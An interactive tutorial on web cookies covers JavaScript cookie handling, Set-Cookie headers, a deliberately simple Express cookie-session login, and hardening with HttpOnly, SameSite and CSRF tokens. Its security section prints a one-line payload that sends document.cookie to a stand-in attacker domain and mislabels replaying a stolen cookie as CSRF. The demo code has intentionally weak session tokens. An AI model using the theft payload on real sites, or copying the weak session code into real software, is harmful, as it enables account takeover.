# Using Cookies

![img](imgs/cookie.png)

### Inspecting cookies for this site.

```html | {type: 'playground'}
<div id="cookies">
</div>
<button onclick="showCookies()">Show cookies</button>

<script>
function showCookies() {
  const output = document.getElementById('cookies');
  output.textContent = '> ' + document.cookie;
}
</script>
```

### Doing action only once.

```html | {type: 'playground'}
<button onclick="doOnce()">Only do something once</button>

<button onclick="clearOutputDoOnce()">
  Clear
</button>

<div>
  <code id="do-once"></code>
</div>
<script>
function doOnce() {
  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    const output = document.getElementById('do-once')
    output.textContent = '> Do something here!'
  }
}

function clearOutputDoOnce() {
  const output = document.getElementById('do-once')
  output.textContent = ''
}
</script>
```

Reset the cookie by running: 
`document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";`

### Setting cookie from server

The [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:

```js
Set-Cookie: <cookie-name>=<cookie-value>
```

```js
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

The client will then send all cookies set by the server in all future requests.

```js
GET /sample_page.html HTTP/2.0
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## Using a cookie to support login

Setting up our express server.

```js
const express = require('express');
const cookieParser = require('cookie-parser');

const app = express()
const port = 3000

app.use(express.json()); 
app.use(express.urlencoded({extended: true}));
app.use(cookieParser());

var sessions = {};
```

Checking if cookie exists

```js
app.get('/',(req,res) => {

  let cookie = req.cookies['demo.connect.sid'];
  console.log( `cookie: ${cookie}`);
  if( cookie ) {  
    res.sendFile(`${__dirname}/www/home.html`);
  } else { res.sendFile(`${__dirname}/www/index.html`); }
});
```

Provide session id to user that can successfully login.

```js
app.post('/login',(req,res) => {
  if( login(req.body.username, req.body.password) )
  {
    let secret = Math.random().toString(36).substring(2);
    res.cookie('demo.connect.sid', secret );
    res.redirect('/');
  }
  ...
});
```

Do authenicated actions as user if cookie exists

```js
app.post('/stash',(req,res) => {
  let cookie = req.cookies['demo.connect.sid'];
  if( cookie ) {
    sessions[cookie] = req.body.secret;
  }
  res.redirect('/');
});

app.get('/secret',(req,res) => {

  let cookie = req.cookies['demo.connect.sid'];
  if( cookie ) {
    res.send( sessions[cookie] )
  } else {
    res.send("Unauthorized access");
  }
});
```

### Try it out

Run `npm install` and then start server with `node index.js`.

```| {type: 'terminal'}
```

<button onclick="window.frames['serviceFrameSend'].src+='';">⟳</button>

*Note:* You can refresh the app by clicking the <kbd>⟳</kbd> button.

<iframe id="serviceFrameSend" src="Login.md/env/port/3000/" width="800" height="600"  frameborder="1"></iframe>


## Security

### Using UUID instead of home-grown random token

https://www.npmjs.com/package/uuid

```js
const { v4: uuidv4 } = require('uuid');
uuidv4(); // ⇨ '1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed'
```

### Stealing cookies.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

If we managed to steal a cookie, we can perform a Cross-site request forgery (CSRF) attack.

```bash | {type: 'command', failed_when:"exitCode!=0"}
curl -s localhost:3000/secret
```

### Securing cookies

Signing cookies, transporting only over https, setting [HttpOnly](https://owasp.org/www-community/HttpOnly), and setting SameSite.

* **sameSite**: a boolean or string indicating whether the cookie is a “same site” cookie (false by default). This can be set to 'strict', 'lax', 'none', or true (which maps to 'strict').
* **secure**: a boolean indicating whether the cookie is only to be sent over HTTPS (false by default for HTTP, true by default for HTTPS). If this is set to true and Node.js is not directly over a TLS connection, be sure to read how to setup Express behind proxies or the cookie may not ever set correctly.
* **httpOnly**: a boolean indicating whether the cookie is only to be sent over HTTP(S), and not made available to client JavaScript (true by default).
* **signed**: a boolean indicating whether the cookie is to be signed (true by default).


### Using CSRF Protection Tokens

1. Server sends CSRF token with rendered view.

```js
var express = require('express');
var router = express.Router();
var { randomBytes } = require('crypto');

/* GET home page. */
router.get('/', function(req, res, next) {
  if (req.session.csrf === undefined) {
    req.session.csrf = randomBytes(100).toString('base64'); // convert random data to a string
  }

  res.render('index', { title: 'Express', token: req.session.csrf });
});
```

2. Any client requests will store CSRF token as client view. 

```html
<form method='POST' action='/'>
  <input type="hidden" name="csrf_token" value="jdljlj3jg84cmfjaldfalJFD#feaDKDKDKDKD==" />
  <label for="username">Username</label>
  <input type="text" name="username" />
  <button type="submit"/>
</form>
```


3. Back-end checks if CSRF token matches server side session.

```js
var express = require('express');
var router = express.Router();
var { randomBytes } = require('crypto');

/* GET home page. */
router.get('/', function(req, res, next) {
  if (req.session.csrf === undefined) {
    req.session.csrf = randomBytes(100).toString('base64');
  }

  res.render('index', { title: 'Express', token: req.session.csrf });
});

router.post('/', function(req, res, next) {
  if (!req.body.csrf) {
    return res.send(`<p style="font-size: 4rem; color: red;">
                     <strong>CSRF Token not included.</strong>
                     </p>`);
  }

  if (req.body.csrf !== req.session.csrf) {
    return res.send(`<p style="font-size: 4rem; color: red;">
                     <strong>CSRF tokens do not match.</strong>
                     </p>`);
  }

  return res.send(`<p style="font-size: 4rem;">
                   <strong>Successful request!</strong>
                   </p>`);
});
```

